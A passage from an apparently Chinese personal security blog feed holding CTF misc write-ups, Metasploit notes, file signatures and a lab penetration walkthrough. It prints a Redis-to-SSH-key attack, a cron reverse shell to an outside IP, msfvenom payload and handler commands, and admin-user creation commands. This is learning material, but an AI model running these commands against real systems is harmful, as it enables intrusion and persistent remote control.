class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs awk">ssh-keygen -t rsa<br><br>(echo -e <span class="hljs-string">&quot;\n\n&quot;</span>; cat id_rsa.pub; echo -e <span class="hljs-string">&quot;\n\n&quot;</span>) &gt; test.txt <span class="hljs-comment">#将公钥id_rsa.pub文件写入test.txt文件</span><br><br>cat test.txt | redis-cli -h <span class="hljs-number">192.168</span>.<span class="hljs-number">220.129</span> -x set crack<br><br><br>redis-cli -h xx.xx.xx.xx<br><br>config set dir <span class="hljs-regexp">/root/</span>.ssh <span class="hljs-comment">#这步需要redis服务使用root权限开启 否则更改不了路径</span><br><br>config set dbfilename authorized_keys<br><br>save<br><br><span class="hljs-keyword">exit</span><br><br><br>cd <span class="hljs-regexp">/root/</span>.ssh<br><br>ssh -i id_rsa root@<span class="hljs-number">172.17</span>.<span class="hljs-number">137.102</span><br></code></pre></td></tr></table></figure><h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-keyword">set</span> shell <span class="hljs-string">&quot;<span class="hljs-subst">\n</span><span class="hljs-subst">\n</span>*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/38.22.133.155/3333 0&gt;&amp;1<span class="hljs-subst">\n</span><span class="hljs-subst">\n</span>&quot;</span><br>config <span class="hljs-keyword">set</span> dir <span class="hljs-regexp">/var/</span>spool<span class="hljs-regexp">/cron/</span><br>config <span class="hljs-keyword">set</span> dbfilename root<br>save<br></code></pre></td></tr></table></figure><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="suid提权"><a href="#suid提权" class="headerlink" title="suid提权"></a>suid提权</h3><p>查找具有suid权限的文件</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text">find / -user root -perm -4000 -print 2&gt;/dev/null<br>find / -perm -u=s -type f 2&gt;/dev/null<br>find / -user root -perm -4000 -exec ls -ldb &#123;&#125; ;<br></code></pre></td></tr></table></figure><h3 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h3>]]></content>
      
      
      <categories>
          
          <category> Penetration </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>misc刷题（杂七杂八）</title>
      <link href="/2023/07/10/misc/1/"/>
      <url>/2023/07/10/misc/1/</url>
      
        <content type="html"><![CDATA[<h2 id="CISCN-2022-初赛-ez-usb"><a href="#CISCN-2022-初赛-ez-usb" class="headerlink" title="[CISCN 2022 初赛]ez_usb"></a>[CISCN 2022 初赛]ez_usb</h2><p>这道题已经提示是一道usb流量分析题</p><p><a href="https://blog.51cto.com/u_15400016/4288275">USB流量取证分析</a></p><blockquote><p>HID（Human Interface Device，人机接口设备）是USB设备中常用的<a href="https://www.usbzh.com/article/detail-273.html">设备类型</a>，是直接与人交互的USB设备，例如键盘、鼠标与游戏杆等。在USB设备中，HID设备的成本较低。另外，HID设备并不一定要有人机交互功能，只要符合HID类别规范的设备都是HID设备。</p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307241723667.png" alt="image-20230724172358412"></p><p>usbhid.data先筛选有hid的流量 一般来讲是键盘、鼠标、游戏杆</p><p>有三组2.8.1  ，2.4.1，2.10.1</p><p>分别把他们重组</p><p>2.4.1的流量包中包数据长度为0 应该是一个混淆包</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307250837270.png" alt="image-20230725083740988"></p><p>一般usb流量隐写，要么键盘隐写，或者是鼠标隐写</p><p>将其放入usb键盘鼠标流量脚本跑 此处使用的是</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307250840287.png" alt="image-20230725084033262"></p><blockquote><p>2.8.1</p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307250840080.png" alt="image-20230725084009040"></p><p>将其中的CAP和DEL删除 </p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">JPEG</span>文件头FFD8FFE0 <span class="hljs-number">00104</span>A46,JPEG文件结尾为FFD9,rar的文件尾C43D7B00 <span class="hljs-number">400700</span>,文件头<span class="hljs-number">52617221</span> <span class="hljs-number">1</span>A0700即Rar!,ZIP文件头<span class="hljs-number">504</span>B0304 <span class="hljs-number">0</span>A00即PK,GIF开头`<span class="hljs-number">47494638</span> <span class="hljs-number">396</span>即GIF,PNG文件头<span class="hljs-number">89504</span>E47 <span class="hljs-number">0</span>D0A1A0A <span class="hljs-number">0000000</span>D <span class="hljs-number">49</span>即|PNG,PNG文件结尾<span class="hljs-number">49454</span>E44 AE426082即IEND bmp文件头<span class="hljs-number">424</span>D即BM<br></code></pre></td></tr></table></figure><p>文件头显示是rar文件，导入010editor 重新导出文件 （注意代码块十六进制需要ctrl+shift+v整段复制）</p><blockquote><p>2.10.1</p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307250845852.png"></p><p>这个猜测是rar文件密码</p><h2 id="CISCN-2018-Picture"><a href="#CISCN-2018-Picture" class="headerlink" title="[CISCN 2018]Picture"></a>[CISCN 2018]Picture</h2><p>拿到题目首先想着binwalk分离文件</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307251003939.png" alt="image-20230725100342848"></p><p>分离以后文件发现文件有base64编码可能</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307251007833.png" alt="image-20230725100758799"></p><p>这边我先解了一遍</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307251014228.png" alt="image-20230725101417193"></p><p>kp开头中间也有pk 考点是文件头混肴，但是这个没法直接换成十六进制</p><p>可以使用在线工具<a href="https://base64.us/">Base64 在线编码解码 </a></p><p>直接换成十六进制导入010editor然后修改文件头导出zip文件</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307251021568.png" alt="image-20230725102139482"></p><p>注释中&lt;- password啊是提示 然后根据前面的报错提示可以得到密码： integer division or modulo by zero</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307251023848.png" alt="image-20230725102327781"></p><p>解压文件得到俩文件 一个假flag 另一个文件是编码</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307251028642.png" alt="image-20230725102808612"></p><p>直接扔工具里面去跑了</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307251029722.png" alt="image-20230725102923662"></p><p>是uuencode编码</p><h2 id="CISCN-2023-初赛-被加密的生产流量"><a href="#CISCN-2023-初赛-被加密的生产流量" class="headerlink" title="[CISCN 2023 初赛]被加密的生产流量"></a>[CISCN 2023 初赛]被加密的生产流量</h2><p>流量包的名字就是modbus 猜测与modbus有关 追踪tcp流 看隐写的内容</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307251114676.png" alt="image-20230725111431413"></p><p>有等号是base编码 可以使用pyshark脚本跑切割，或者就是手动一个一个写下来这个</p><p>放进解码器跑就行了</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307251418825.png" alt="image-20230725141828416"></p><h2 id="CISCN-2022-初赛-everlasting-night"><a href="#CISCN-2022-初赛-everlasting-night" class="headerlink" title="[CISCN 2022 初赛]everlasting_night"></a>[CISCN 2022 初赛]everlasting_night</h2><p>一道lsb隐写题</p><p>首先打开010editor 查看这张png图片的hex 文件头和文件尾是全的 文件尾之后还有一串十六进制</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307281102581.png" alt="image-20230728110233535"></p><p>32位 ？？？  md5 解密</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307281107876.png" alt="image-20230728110753829"></p><p>ohhWh04m1 不知道是什么东西 先留着再说</p><p>stegsolve 打开图片 发现在alpha 通道2里面发现一点不对 </p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307281111490.png" alt="image-20230728111136364"></p><p>用data extract 打开alpha通道通道2  以列</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307281117018.png" alt="image-20230728111757955">  </p><p>是有一串字符串的 还是不知道要用来干什么 </p><p>学lsb隐写  那就跑脚本了 上面的字符串是lsb隐写的密码 </p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307281123269.png" alt="image-20230728112352233"></p><p>先导了一份文本文件，pk文件头 导一份zip出来</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307281123857.png" alt="image-20230728112306789"></p><p>zip解压缩有密码，拿第一个密码解压 出了一个flag文件 看格式应该是png 但是文件损坏</p><p>看wp 需要用gimp打开 并且需要改一下后缀名为data</p><p><code>gimp flag.data</code></p><p>改一点宽度 就出来了</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307281127822.png" alt="image-20230728112729732"></p><h2 id="CISCN-2023-初赛-pyshell"><a href="#CISCN-2023-初赛-pyshell" class="headerlink" title="[CISCN 2023 初赛]pyshell"></a>[CISCN 2023 初赛]pyshell</h2><p>给了网址，node1.anna.nssctf.cn:28159，并且有端口，</p><p>nc直接连接 ，发现是python shell</p><p>这里使用 Python REPL 的特性，下划线表示上一次求值的结果，使用逐个字符拼接的方式将 eval 所需的字符串拼接出来</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202308041610304.png" alt="image-20230804161015171"></p><p>引入pwn python包， 我不记得脚本在哪了 但是因为好像反弹的shell进程连接时间很短 不够直接一个一个在shell里面打出来的，所以写个脚本sleep（1）一次性全发出去</p><h2 id="2023-ciscnpuzzle"><a href="#2023-ciscnpuzzle" class="headerlink" title="2023 ciscnpuzzle"></a>2023 ciscnpuzzle</h2><p>一道bmp图片拼图题 </p><p>就是把裁剪下来的bmp小图片拼成大图片，然后把小图片在原图片中的位置信息隐写在了bmp保留字段里 </p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202309142059498.png" alt="image-20230914205921370"></p><p>bfReserved1 和2 里</p><p>首先根据隐写的位置信息对列表size排序 </p><p>计算图片的总高度，取最大的位置信息的纵坐标加上对应尺寸的高度。</p><p>计算图片的总宽度，取最大的位置信息的横坐标加上对应尺寸的宽度。</p><p>关于bmp文件头结构写在了文件结构刷题里了</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202309142103829.png" alt="image-20230914210339756"></p><p>脚本跑出文件高度和宽度 为下一步拼图做准备</p>]]></content>
      
      
      <categories>
          
          <category> Misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctfshow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>相关工具使用（未整理版）</title>
      <link href="/2023/07/05/tool/1/"/>
      <url>/2023/07/05/tool/1/</url>
      
        <content type="html"><![CDATA[<h1 id="Audacity"><a href="#Audacity" class="headerlink" title="Audacity"></a>Audacity</h1><p>音频处理软件，常用于查看音频隐写，类似摩斯密码等</p><p>首先打开文件，然后观察是否有多个音轨，然后观察音轨中是否有摩斯密码等相关的信息（长短）</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307241441432.png" alt="image-20230724144117152"></p><p>然后对照这翻译</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307241445142.png" alt="image-20230724144501063"></p><h1 id="msf的使用"><a href="#msf的使用" class="headerlink" title="msf的使用"></a>msf的使用</h1><figure class="highlight hsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs hsp">Kali中MSF中session相关命令：<br><br>sessions    –h 查看帮助<br>sessions -i &lt;ID值&gt;  <span class="hljs-meta">#进入会话  </span><br><br> -k  杀死会话<br>background  <span class="hljs-meta">#将当前会话放置后台</span><br><span class="hljs-keyword">run</span>  <span class="hljs-meta">#执行已有的模块，输入run后按两下tab，列出已有的脚本</span><br>info    <span class="hljs-meta">#查看已有模块信息</span><br>getuid <span class="hljs-meta">#查看权限 </span><br>getpid <span class="hljs-meta">#获取当前进程的pid</span><br><span class="hljs-keyword">sysinfo</span> <span class="hljs-meta">#查看目标机系统信息</span><br>ps <span class="hljs-meta">#查看当前活跃进程   </span><br><br>kill <span class="hljs-meta">#&lt;PID值&gt; 杀死进程</span><br>idletime <span class="hljs-meta">#查看目标机闲置时间</span><br>reboot<span class="hljs-meta">#重启</span><br>shutdown   <span class="hljs-meta">#关机</span><br>shell <span class="hljs-meta">#进入目标机<span class="hljs-keyword">CMD</span>窗口</span><br></code></pre></td></tr></table></figure><h2 id="反弹加提权的一般步骤"><a href="#反弹加提权的一般步骤" class="headerlink" title="反弹加提权的一般步骤"></a>反弹加提权的一般步骤</h2><p>首先先用msfvenom生成攻击载荷</p><p><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.109 lport=12345 -f exe &gt;s.exe</code></p><p>上传载荷致服务器端，要选一个可以执行的目录文件，用wt.asp先扫一遍目录先看看</p><p>然后拿ASPXSpy2014.aspx（admin）执行文件</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307261114178.png" alt="image-20230726111408035"></p><p>在此之前先开启监听</p><p><code>msfconsole</code></p><p><code>use exploit/multi/handler</code></p><p><code>set payload windows/meterpreter/reverse_tcp</code></p><p><code>set lhost 192.168.x.x</code></p><p><code>set lport xx ()随便空端口号就行)</code></p><p><code>run</code></p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307261512384.png" alt="image-20230724145454737"></p><p>等待上线</p><p>上线以后检测提权的漏洞 </p><p><code>use post/multi/recon/local_exploit_suggester</code></p><p><code>set session 1</code></p><p><code>run</code></p><p>有可能会提示检测中途断开，更新一下msf</p><p>看一下能用的漏洞模块</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307261512838.png" alt="image-20230725220840944"></p><p>利用一下，提权完毕</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307261509599.png" alt="image-20230725221029006"></p><h2 id="后渗透"><a href="#后渗透" class="headerlink" title="后渗透"></a>后渗透</h2><p>后渗透就感觉很刑了</p><p>多个方法玩转主机</p><p>help查看能用的功能 但是呢这种英文版肯定是不适合我这种废物的</p><p>所以呢肯定得搞一个中文版看看<a href="https://blog.csdn.net/weixin_45605352/article/details/115824811">(Meterpreter命令详解）</a></p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307261530835.png" alt="image-20230726153009757"></p><p>要是进了shell发现奇奇怪怪的玄学问题那也只好全部关掉重新抓个进去用了</p><p>meterpreter 是可以加载很多模块进行利用的</p><h3 id="模块利用"><a href="#模块利用" class="headerlink" title="模块利用"></a>模块利用</h3><p>我是先学了<strong>kiwi</strong>模块</p><p>这个首先得load kiwi加载模块</p><p>其次得关注一下系统的架构 64x的要把进程迁到64x进程中 kiwi默认实现32x的</p><p>sysinfo看系统信息</p><p>ps看进程 </p><p>migrate [PID]换进程</p><p>具体可以参考<a href="https://blog.csdn.net/weixin_45588247/article/details/119497964">MSF中kiwi(mimikatz)模块的使用</a></p><p>这个是shell中主机操作 <a href="https://chenchena.blog.csdn.net/article/details/124493550">后渗透主机操作_渗透后控制主机_</a>用来关关防火墙，远控桌面</p><h3 id="cmd命令"><a href="#cmd命令" class="headerlink" title="cmd命令"></a>cmd命令</h3><p>补一条拿了管理员权限增加用户命令</p><p>net user [name] [paaswd] &#x2F;add #增加用户</p><p>net localgroup #查看计算机本地组用户，看一下什么是有管理员权限的</p><p>net user [name]# 用于查看用户的相关信息，可以看用户组的改变</p><p>net localgroup Adminstrators(组) [name] &#x2F;add</p><h2 id="文件格式"><a href="#文件格式" class="headerlink" title="文件格式"></a>文件格式</h2><h3 id="文件头和文件尾"><a href="#文件头和文件尾" class="headerlink" title="文件头和文件尾"></a>文件头和文件尾</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java">JPEG (jpg)，             　文件头：FFD8FF　　　　　　　　　　　　　　　　　　　　　　　 文件尾：FF D9　　　　　　　　　　　　　　　<br><span class="hljs-title function_">PNG</span> <span class="hljs-params">(png)</span>，            　　 文件头：<span class="hljs-number">89504E47</span>　　　　　　　　　　　　　　　　　　　　　　文件尾：AE <span class="hljs-number">42</span> <span class="hljs-number">60</span> <span class="hljs-number">82</span><br>GIF (gif)，              　　文件头：<span class="hljs-number">47494638</span>　　　　　　　　　　　　　　　　　　　　　　文件尾：<span class="hljs-number">00</span> 3B                                 ZIP <span class="hljs-title function_">Archive</span> <span class="hljs-params">(zip)</span>，           文件头：504B0304　　　　　　　　　　　　　　　　　　　　　　文件尾：<span class="hljs-number">50</span> 4B<br><br><span class="hljs-title function_">TIFF</span> <span class="hljs-params">(tif)</span>，              　  文件头：49492A00　　　　　　　　　　　　　　　　　　　　　　文件尾：<br>Windows <span class="hljs-title function_">Bitmap</span> <span class="hljs-params">(bmp)</span>，      文件头：<span class="hljs-number">424D</span>　　　　　　　　　　　　　　　　　　　　　　　　 文件尾：<br>CAD (dwg)，               文件头：<span class="hljs-number">41433130</span>　　　　　　　　　　　　　　　　　　　　　　文件尾：<br>Adobe <span class="hljs-title function_">Photoshop</span> <span class="hljs-params">(psd)</span>，      文件头：<span class="hljs-number">38425053</span>　　　　　　　　　　　　　　　　　　　　　　文件尾：<br>Rich Text <span class="hljs-title function_">Format</span> <span class="hljs-params">(rtf)</span>，       文件头：7B5C727466　　　　　　　　　　　　　　　　　　　　  文件尾：<br>XML (xml)，                文件头：3C3F786D6C　　　　　　　　　　　　　　　　　　　　 文件尾：<br>HTML (html)，              文件头：68746D6C3E<br>Email [thorough only] (eml)，   文件头：44656C69766572792D646174653A<br>Outlook <span class="hljs-title function_">Express</span> <span class="hljs-params">(dbx)</span>，       文件头：CFAD12FEC5FD746F<br><span class="hljs-title function_">Outlook</span> <span class="hljs-params">(pst)</span>，             文件头：2142444E<br>MS Word/Excel (xls.or.doc)，    文件头：D0CF11E0<br>MS <span class="hljs-title function_">Access</span> <span class="hljs-params">(mdb)</span>，           文件头：5374616E64617264204A<br><span class="hljs-title function_">WordPerfect</span> <span class="hljs-params">(wpd)</span>，          文件头：FF575043<br>Adobe <span class="hljs-title function_">Acrobat</span> <span class="hljs-params">(pdf)</span>，        文件头：255044462D312E<br><span class="hljs-title function_">Quicken</span> <span class="hljs-params">(qdf)</span>，             文件头：AC9EBD8F<br>Windows <span class="hljs-title function_">Password</span> <span class="hljs-params">(pwl)</span>，     文件头：E3828596<br><br>RAR <span class="hljs-title function_">Archive</span> <span class="hljs-params">(rar)</span>，           文件头：<span class="hljs-number">52617221</span><br>Wave (wav)，               文件头：<span class="hljs-number">57415645</span><br>AVI (avi)，                 文件头：<span class="hljs-number">41564920</span><br>Real <span class="hljs-title function_">Audio</span> <span class="hljs-params">(ram)</span>，           文件头：2E7261FD<br>Real <span class="hljs-title function_">Media</span> <span class="hljs-params">(rm)</span>，            文件头：2E524D46<br><span class="hljs-title function_">MPEG</span> <span class="hljs-params">(mpg)</span>，              文件头：000001BA<br><span class="hljs-title function_">MPEG</span> <span class="hljs-params">(mpg)</span>，              文件头：000001B3<br><span class="hljs-title function_">Quicktime</span> <span class="hljs-params">(mov)</span>，           文件头：6D6F6F76<br>Windows <span class="hljs-title function_">Media</span> <span class="hljs-params">(asf)</span>，        文件头：3026B2758E66CF11<br><span class="hljs-title function_">MIDI</span> <span class="hljs-params">(mid)</span>，                文件头：4D546864<br></code></pre></td></tr></table></figure><p>EXE文件的反编译和分析</p><p>首先把exe放入detect it easy 查看其打包工具</p><p><code>E:\暗月\tool\ctf工具箱\ctf工具箱\逆向工程winlinux\die_win64_portable_3.08_x64</code></p><p>然后根据列出来的打包工具进行解包</p>]]></content>
      
      
      <categories>
          
          <category> Tool </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 相关工具使用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>暗月项目四（完整渗透测试）</title>
      <link href="/2023/07/01/penetration/4/"/>
      <url>/2023/07/01/penetration/4/</url>
      
        <content type="html"><![CDATA[<h3 id="项目四（完整渗透测试）"><a href="#项目四（完整渗透测试）" class="headerlink" title="项目四（完整渗透测试）"></a>项目四（完整渗透测试）</h3><h2 id="主机扫描"><a href="#主机扫描" class="headerlink" title="主机扫描"></a>主机扫描</h2><h3 id="1-nmap-sn"><a href="#1-nmap-sn" class="headerlink" title="(1)nmap-sn"></a>(1)nmap-sn</h3><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306112054777.png" alt="image-20230611205450303"></p><h3 id="2-netdiscover-i"><a href="#2-netdiscover-i" class="headerlink" title="(2)netdiscover -i"></a>(2)netdiscover -i</h3><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306112056939.png" alt="image-20230611205651833"></p><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p>首先用masscan扫描</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306112103816.png" alt="image-20230611210309546"></p><p>然后再用nmap进行端口探测</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306121509909.png" alt="image-20230612150949554"></p><p>通过对端口的解析，可以看每个端口对应的服务</p><h2 id="改dns服务器地址"><a href="#改dns服务器地址" class="headerlink" title="改dns服务器地址"></a>改dns服务器地址</h2><p>发现是由dns53 端口开启的，靶机应该是有dns服务的，所以要先把dns服务器改成靶机地址</p><p>（1）Windows</p><p><img src="C:/Users/23167/AppData/Roaming/Typora/typora-user-images/image-20230612154425537.png" alt="image-20230612154425537"></p><p>（2）kali</p><p> &#x2F;etc&#x2F;resolv.conf</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306121600839.png" alt="image-20230612160048638"></p><h2 id="wfuzz爆破子域名"><a href="#wfuzz爆破子域名" class="headerlink" title="wfuzz爆破子域名"></a>wfuzz爆破子域名</h2><p>wfuzz学习地址<a href="https://blog.csdn.net/qq_45869039/article/details/108874749">wfuzz学习_wfuzz参数_</a></p><p>&#x2F;usr&#x2F;share&#x2F;amass&#x2F;wordlists&#x2F;subdomains-top1mil-110000.txt kali自带的子域名爆破字典</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306121603759.png" alt="image-20230612160330695"></p><p>new www ww2 WWW </p><h2 id="第一个网站的渗透（new-）"><a href="#第一个网站的渗透（new-）" class="headerlink" title="第一个网站的渗透（new.）"></a>第一个网站的渗透（new.）</h2><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306250951130.png" alt="image-20230625095057736"></p><p>是一个dedecms类型网站 </p><p>一般dedecms是有固定的目录结构的，那么根据目录结构能访问到其他页面</p><p>如果像我这种小白不了解dedecms的话，可以先扫描一遍该网站的目录结构</p><p>用<a href="%5B(54%E6%9D%A1%E6%B6%88%E6%81%AF">dirbuster</a> Web渗透之信息收集——目录扫描从御剑到Dirbuster_Mr. Wanderer的博客-CSDN博客](<a href="https://blog.csdn.net/Mr_Wanderer/article/details/107410457))%E5%85%88%E6%89%AB%E6%8F%8F%E4%B8%80%E8%BE%B9%E7%BD%91%E7%AB%99%E7%9B%AE%E5%BD%95">https://blog.csdn.net/Mr_Wanderer/article/details/107410457))先扫描一边网站目录</a> 用御剑效果差不多，看在本机还是kali里完成实验了</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306251001538.png" alt="image-20230625100119420"></p><p>查看dedecms版本号，网上找对应的exp，</p><p>版本号的相对路径：&#x2F;data&#x2F;admin&#x2F;ver.txt</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306251008176.png" alt="image-20230625100820990"></p><p>20150618是存在漏洞的 <a href="http://www.hekaiyu.cn/hacker/3060.html">Dedecms 20150618 注入漏洞</a></p><p>根据文章实现exp</p><p>member模块开启，可以注册登录</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306251015609.png" alt="image-20230625101514441"></p><p>先注册一个账号</p><p>增加一个分类<img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306251711750.png" alt="image-20230625171115401"></p><p>利用给的exp能跑出admin账号的密码md5值</p><p>该exp需要获取一个登录账号的cookie（requests包中） 需要在python2环境下运行</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306251711785.png" alt="image-20230625171131658"></p><p>获得admin账号密码进行登录</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306251716192.png" alt="image-20230625171627055"></p><p>获取权限后上传小马</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307061716006.png" alt="image-20230706171558794"></p><p>拿蚁剑连后上传大马（ASPXSpy2014.aspx admin）查看是否可执行cmd文件，然后开始提权</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307241107956.png" alt="image-20230724110742886"></p><p>生成攻击载荷</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307241043543.png" alt="image-20230724104346468"></p><p>查看服务器可写目录，然后上传攻击载荷</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307241045107.png" alt="image-20230724104545057"></p><p>反弹shell</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307241112877.png" alt="image-20230724111207836"></p><p>有关msfconsole的使用可以重开一篇</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307241454779.png" alt="image-20230724145454737"></p><p>监听后连上</p><p>然后提权 首先用use post&#x2F;multi&#x2F;recon&#x2F;local_exploit_suggester跑一边可以利用的exp</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307252208247.png" alt="image-20230725220840944"></p><p>跑完以后就看模块利用 不会使用模块可以百度一下</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307252210072.png" alt="image-20230725221029006"></p><p>提成功了获得系统权限</p><p>然后找flag 可以先在meterpreter下先 <code>search -f *flag*</code></p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307261032479.png" alt="image-20230726103234108"></p><p>然后再进入shell 查看内容（玄学卡实在不行重新弹一个shell回来）</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307261033400.png" alt="image-20230726103315356"></p><h2 id="第二个域名渗透（ww2）"><a href="#第二个域名渗透（ww2）" class="headerlink" title="第二个域名渗透（ww2）"></a>第二个域名渗透（ww2）</h2><h3 id="gobuster-目录扫描"><a href="#gobuster-目录扫描" class="headerlink" title="gobuster 目录扫描"></a>gobuster 目录扫描</h3><p>感觉和dirbuster效果差也差不多， 具体操作 相对可以</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307311009701.png" alt="image-20230731100905532"></p><p>比dirbuster功能相对多一点，能扫dns，fuzz，tftp？ 我感觉需要一个相对清楚的目录结构，dirbuster可能会更适合一点，如果是查看该网站有什么特定类型文件，那就gobuster，当然功能性上也是gobuster nice</p><p>gobuster dir -u <a href="http://ww2.cc123.com/">http://ww2.cc123.com</a> -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-2.3-medium.txt -x “aspx,html” -o ww2dir</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307311013387.png" alt="image-20230731101327317"></p><p>扫完简单看一下有哪些aspx和html，html占据较大部分，有一些aspx可以实现动态交互，然后找漏洞</p><h3 id="sql注入漏洞"><a href="#sql注入漏洞" class="headerlink" title="sql注入漏洞"></a>sql注入漏洞</h3><p>老的静态网站， sql语言   select * from ### username&#x3D;‘  ’ and password &#x3D; ‘#####’</p><p>存在注入select * 